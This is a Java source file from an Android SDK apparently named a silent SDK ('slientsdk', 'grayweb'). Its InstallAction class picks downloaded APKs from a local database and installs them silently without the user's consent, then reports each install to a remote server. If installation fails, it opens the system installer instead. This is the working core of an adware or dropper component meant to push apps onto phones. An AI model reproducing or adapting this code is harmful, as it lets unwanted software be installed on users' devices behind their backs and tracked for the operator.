package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import com.litesuits.common.assist.SilentInstaller;

import java.io.File;
import java.sql.SQLException;
import java.util.List;

import sdk.grayweb.com.slientsdk.api.Action;
import sdk.grayweb.com.slientsdk.api.ActionApi;
import sdk.grayweb.com.slientsdk.http.HttpClient;
import sdk.grayweb.com.slientsdk.http.TextHttpListener;
import sdk.grayweb.com.slientsdk.model.ActionModel;
import sdk.grayweb.com.slientsdk.model.ApkModel;
import sdk.grayweb.com.slientsdk.util.DownLoadUtil;

/**
 * Created by engine on 16/5/11.
 */
public class InstallAction extends AbstractAction {
    public InstallAction(Context context) {
        super(context);
    }

    @Override
    public int doAction() {
        try {
            List<ApkModel> apkModels = apkModelDao.queryBuilder().orderBy("level",false).where().eq("status",1).query();
            ApkModel targetApk = null;
            for (int i = 0; i < apkModels.size(); i++) {
                ApkModel model = apkModels.get(i);
                if (!hasInstall(model.packagename)) {//没有安装
                    if(DownLoadUtil.hasDown(model.apkpath)) {
                        targetApk = model;
                        installApk(targetApk.packagename, DownLoadUtil.getFileNameByUrl(targetApk.apkpath));
                        break;
                    }
                }
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
        return 0;
    }

    private int installApk(String packageName ,String apkPath){
        File  file = new File(apkPath);
        if(file.exists()) {
            SilentInstaller silentInstaller = new SilentInstaller();
            int result = silentInstaller.installSilent(mContext, apkPath);
            if(result==SilentInstaller.INSTALL_SUCCEEDED){
                ActionModel actionModel = new ActionModel();
                actionModel.packageName = packageName ;
                actionModel.type=2 ;
                actionModel.time=System.currentTimeMillis();
                ActionApi api = new ActionApi(mContext,packageName, Action.INSTALL);
                HttpClient.request(api, new TextHttpListener(mContext) {
                    @Override
                    public void onSuccess(String text) {

                    }
                });
                try {
                    actionDao.create(actionModel) ;
                } catch (SQLException e) {
                    e.printStackTrace();
                }
                return 1;
            }else {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setDataAndType(Uri.parse("file://" + apkPath),"application/vnd.android.package-archive");
                mContext.startActivity(intent);
                return 2;
            }
        }else {
            return  -1 ;
        }
    }
}
